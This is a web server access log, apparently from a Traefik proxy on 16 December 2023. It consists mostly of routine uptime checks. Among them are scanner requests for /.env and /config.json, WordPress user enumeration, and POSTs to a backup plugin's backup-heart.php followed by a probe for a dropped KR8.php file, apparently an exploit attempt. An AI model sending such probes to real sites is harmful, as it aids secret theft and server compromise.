164.92.192.25 - - [16/Dec/2023:05:44:23 +0000] "GET /config.json HTTP/1.1" 404 19 "-" "-" 1169 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:23 +0000] "GET /telescope/requests HTTP/1.1" 404 19 "-" "-" 1170 "-" "-" 0ms
164.92.192.25 - - [16/Dec/2023:05:44:23 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 404 19 "-" "-" 1171 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:05:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1172 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1173 "www@docker" "http://172.29.0.8:80" 0ms
205.210.31.232 - - [16/Dec/2023:05:45:25 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1174 "dashboard@internal" "-" 0ms
205.210.31.232 - - [16/Dec/2023:05:45:25 +0000] "GET /dashboard/ HTTP/1.1" 200 3124 "-" "-" 1175 "dashboard@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:05:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1176 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1177 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1178 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1179 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1180 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1181 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1182 "www@docker" "http://172.29.0.8:80" 0ms
198.235.24.130 - - [16/Dec/2023:05:48:40 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 1183 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1184 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1185 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1186 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1187 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1188 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1189 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:05:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1190 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1191 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1192 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1193 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1194 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1195 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1196 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1197 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:05:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1198 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1199 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1200 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1201 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1202 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1203 "www@docker" "http://172.29.0.8:80" 0ms
35.203.210.240 - - [16/Dec/2023:05:58:48 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1204 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:05:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1205 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1206 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1207 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1208 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1209 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1210 "www@docker" "http://172.29.0.8:80" 0ms
98.101.191.8 - - [16/Dec/2023:06:01:59 +0000] "GET /trace/ HTTP/2.0" 200 4079 "-" "-" 1211 "livetrace@docker" "http://172.29.0.3:80" 5ms
98.101.191.8 - - [16/Dec/2023:06:01:59 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 200 1387 "-" "-" 1212 "livetrace@docker" "http://172.29.0.3:80" 1ms
98.101.191.8 - - [16/Dec/2023:06:01:59 +0000] "GET /favicon.ico HTTP/2.0" 499 21 "-" "-" 1213 "www@docker" "http://172.29.0.8:80" 28ms
68.69.186.30 - - [16/Dec/2023:06:02:02 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1214 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:06:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1215 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1216 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1217 "www@docker" "http://172.29.0.8:80" 0ms
54.36.115.221 - - [16/Dec/2023:06:03:30 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1218 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [16/Dec/2023:06:03:30 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1219 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:06:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1220 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1221 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1222 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1223 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1224 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1225 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1226 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1227 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1228 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:06:08:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1229 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:06:08:05 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1230 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:06:08:05 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1231 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:06:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1232 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1233 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1234 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1235 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1236 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1237 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1238 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1239 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1240 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1241 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1242 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1243 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1244 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1245 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1246 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1247 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1248 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1249 "www@docker" "http://172.29.0.8:80" 0ms
35.203.211.151 - - [16/Dec/2023:06:16:52 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1250 "web-to-websecure@internal" "-" 0ms
35.203.211.151 - - [16/Dec/2023:06:16:52 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1251 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:06:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1252 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1253 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1254 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1255 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1256 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1257 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1258 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1259 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1260 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1261 "www@docker" "http://172.29.0.8:80" 0ms
174.138.61.44 - - [16/Dec/2023:06:21:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1262 "-" "-" 0ms
174.138.61.44 - - [16/Dec/2023:06:21:48 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1263 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:06:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1264 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1265 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1266 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1267 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1268 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1269 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1270 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1271 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1272 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1273 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1274 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1275 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1276 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1277 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:06:28:54 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1278 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:06:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1279 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1280 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1281 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1282 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1283 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1284 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1285 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1286 "www@docker" "http://172.29.0.8:80" 0ms
90.151.171.106 - - [16/Dec/2023:06:32:51 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 1287 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [16/Dec/2023:06:33:01 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 1288 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:06:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1289 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1290 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1291 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1292 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1293 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1294 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1295 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1296 "www@docker" "http://172.29.0.8:80" 0ms
34.76.158.233 - - [16/Dec/2023:06:36:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1297 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:06:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1298 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1299 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1300 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1301 "www@docker" "http://172.29.0.8:80" 0ms
194.113.236.177 - - [16/Dec/2023:06:39:19 +0000] "POST /wp-content/plugins/backup-backup/includes/backup-heart.php HTTP/1.1" 308 18 "-" "-" 1302 "web-to-websecure@internal" "-" 0ms
194.113.236.177 - - [16/Dec/2023:06:39:20 +0000] "POST /wp-content/plugins/backup-backup/includes/backup-heart.php HTTP/1.1" 404 19 "-" "-" 1303 "-" "-" 0ms
194.113.236.177 - - [16/Dec/2023:06:39:20 +0000] "GET /wp-content/plugins/backup-backup/includes/KR8.php HTTP/1.1" 301 17 "-" "-" 1304 "web-to-websecure@internal" "-" 0ms
194.113.236.177 - - [16/Dec/2023:06:39:21 +0000] "GET /wp-content/plugins/backup-backup/includes/KR8.php HTTP/1.1" 404 19 "-" "-" 1305 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:06:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1306 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1307 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1308 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1309 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1310 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1311 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1312 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1313 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1314 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1315 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1316 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1317 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1318 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1319 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1320 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1321 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1322 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1323 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1324 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1325 "www@docker" "http://172.29.0.8:80" 0ms
167.94.146.58 - - [16/Dec/2023:06:48:38 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1326 "web-to-websecure@internal" "-" 0ms
167.94.146.58 - - [16/Dec/2023:06:48:41 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1327 "web-to-websecure@internal" "-" 0ms
167.94.146.58 - - [16/Dec/2023:06:48:45 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1328 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:06:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1329 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1330 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1331 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1332 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1333 "www@docker" "http://172.29.0.8:80" 1ms
57.129.23.166 - - [16/Dec/2023:06:51:34 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1334 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:06:51:35 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1335 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:06:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1336 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1337 "www@docker" "http://172.29.0.8:80" 0ms
159.203.224.31 - - [16/Dec/2023:06:52:31 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1338 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:06:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1339 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1340 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1341 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1342 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1343 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1344 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:06:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1345 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:06:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1346 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1347 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1348 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1349 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1350 "www@docker" "http://172.29.0.8:80" 0ms
98.101.191.8 - - [16/Dec/2023:06:58:25 +0000] "GET /trace/ HTTP/2.0" 200 4079 "-" "-" 1351 "livetrace@docker" "http://172.29.0.3:80" 4ms
